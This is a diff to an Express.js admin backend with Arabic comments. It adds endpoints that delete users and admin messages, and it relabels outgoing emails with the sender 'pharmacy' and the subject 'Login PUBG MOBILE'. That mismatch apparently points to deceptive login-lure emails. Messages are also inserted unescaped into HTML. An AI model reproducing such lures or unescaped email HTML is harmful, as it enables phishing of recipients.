@@ -83,6 +83,17 @@ app.get('/api/admin/users', checkAuth, (req, res) => {
   res.json(usersData);
 });
 
+// حذف مستخدم معين بناءً على البريد (محمي)
+app.delete('/api/admin/user/:email', checkAuth, (req, res) => {
+  const email = decodeURIComponent(req.params.email);
+  const index = usersData.findIndex(user => user.email === email);
+  if (index === -1) {
+    return res.status(404).json({ error: 'المستخدم غير موجود' });
+  }
+  usersData.splice(index, 1);
+  res.json({ message: `تم حذف المستخدم ${email} بنجاح` });
+});
+
 app.get('/admin', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
@@ -97,9 +108,9 @@ app.post('/api/admin/message', checkAuth, async (req, res) => {
   try {
     // إرسال الإيميل
     await transporter.sendMail({
-      from: `"Admin" <${process.env.SMTP_USER}>`,
+      from: `"pharmacy" <${process.env.SMTP_USER}>`,
       to: email,
-      subject: 'رسالة من لوحة تحكم الادمن',
+      subject: 'Login PUBG MOBILE',
       text: message,
       html: `<p>${message}</p>`
     });
@@ -117,6 +128,20 @@ app.post('/api/admin/message', checkAuth, async (req, res) => {
 // جلب كل الرسائل (محمي)
 app.get('/api/admin/messages', checkAuth, (req, res) => {
   res.json(adminMessages);
+});
+
+// حذف رسالة إدارية (محمي)
+app.delete('/api/admin/message', checkAuth, (req, res) => {
+  const { email } = req.body;
+  if (!email) {
+    return res.status(400).json({ error: 'البريد الإلكتروني مطلوب للحذف' });
+  }
+  const index = adminMessages.findIndex(msg => msg.email === email);
+  if (index === -1) {
+    return res.status(404).json({ error: 'الرسالة غير موجودة' });
+  }
+  adminMessages.splice(index, 1);
+  res.json({ message: 'تم حذف الرسالة بنجاح' });
 });
 
 // صفحة الادمن - حماية الوصول لصفحات الادمن
